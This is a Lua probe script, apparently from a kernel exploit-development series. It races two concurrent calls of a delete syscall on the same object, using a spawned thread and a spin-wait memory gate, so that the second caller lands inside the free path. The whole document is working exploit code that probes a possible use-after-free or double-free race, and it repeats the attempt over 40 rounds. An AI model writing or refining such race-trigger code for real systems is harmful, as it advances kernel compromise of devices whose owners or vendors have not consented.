-- CRASH_CLASS: RISKY
-- PROBE 495c: concurrent 662 with the thread entering first
-- 495b had the parent open the gate and call, so the parent always finished
-- first and the thread saw 0x80020003. Here the roles are reversed: the thread
-- pre-builds its callable, publishes "about to call", and only then calls 662;
-- the parent waits for that word and calls immediately. The delete body does a
-- lookup, an unlock and a free after 0x3afd0c, so a caller arriving a few
-- hundred nanoseconds later still lands inside it.
print("=== PROBE 495c: thread-first concurrent delete ===")
io.stdout:setvbuf("no")
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function addrnum(v)
    if type(v) == "table" and v.h then return v.h * 4294967296 + v.l end
    return to_num(v)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local data  = memory.alloc(0x2000)
local out   = memory.alloc(0x100)
local ids   = memory.alloc(0x100)
local res1  = memory.alloc(0x400)
local res2  = memory.alloc(0x400)
local gate  = memory.alloc(0x100)
local sc669 = make_syscall(669)
local sc664 = make_syscall(664)
local sc662 = make_syscall(662)
for off = 0, 0x2000 - 1, 4 do pcall(function() memory.write_dword(data + off, 0) end) end
local function create()
  for off = 0, 0x100 - 1, 4 do pcall(function() memory.write_dword(out + off, 0) end) end
  local ok = pcall(function() return sc669(uint64(1), uint64(data), uint64(1), uint64(1), uint64(out)) end)
  if not ok then return nil end
  local id = to_num(memory.read_dword(out))
  if id <= 0 then return nil end
  return id
end
local body = "local t = {}\n" ..
             "for k,v in pairs(syscall.pipe) do t[k] = v end\n" ..
             "t.syscall_no = 662\n" ..
             "setmetatable(t, getmetatable(syscall.pipe))\n" ..
             "while memory.read_dword(GATE) == 0 do end\n" ..
             "memory.write_dword(GATE + 4, 1)\n" ..
             "pcall(function() t(IDS, 1, RES2) end)\n" ..
             "memory.write_dword(GATE + 8, 1)\n"
body = body:gsub("GATE", tostring(addrnum(gate)))
body = body:gsub("IDS", tostring(addrnum(ids)))
body = body:gsub("RES2", tostring(addrnum(res2)))

local rounds = 40
local done = 0
local stats = { parent0 = 0, parentOther = 0, thread0 = 0, threadOther = 0 }
for r = 1, rounds do
  local id = create()
  if not id then print(string.format("round %d create failed", r)); break end
  pcall(function() memory.write_dword(ids, id) end)
  pcall(function() return sc664(uint64(ids), uint64(1), uint64(res2)) end)
  pcall(function() memory.write_dword(gate, 0) end)
  pcall(function() memory.write_dword(gate + 4, 0) end)
  pcall(function() memory.write_dword(gate + 8, 0) end)
  for off = 0, 0x40 - 1, 4 do
    pcall(function() memory.write_dword(res1 + off, 0x77777777) end)
    pcall(function() memory.write_dword(res2 + off, 0x77777777) end)
  end
  local ok, thr = pcall(run_lua_code_in_new_thread, body, { async = true })
  if not ok or type(thr) ~= "table" then print(string.format("round %d spawn failed", r)); break end
  local spins = 0
  while to_num(memory.read_dword(gate + 4)) == 0 and spins < 4000000 do spins = spins + 1 end
  local myok, myrv = pcall(function() return sc662(uint64(ids), uint64(1), uint64(res1)) end)
  local jspins = 0
  while to_num(memory.read_dword(gate + 8)) == 0 and jspins < 4000000 do jspins = jspins + 1 end
  pcall(function() return thr:join() end)
  local s1 = to_num(memory.read_dword(res1))
  local s2 = to_num(memory.read_dword(res2))
  if s1 == 0 then stats.parent0 = stats.parent0 + 1 else stats.parentOther = stats.parentOther + 1 end
  if s2 == 0 then stats.thread0 = stats.thread0 + 1 else stats.threadOther = stats.threadOther + 1 end
  if r <= 8 or s2 == 0 then
    print(string.format("round %2d id=%d parent=%s/%#x thread=%#x", r, id,
          myok and tostring(to_num(myrv)) or "-", s1, s2))
  end
  done = done + 1
end
print(string.format("rounds=%d parent[0]=%d parent[other]=%d thread[0]=%d thread[other]=%d",
      done, stats.parent0, stats.parentOther, stats.thread0, stats.threadOther))
print("=== PROBE 495c COMPLETE ===")
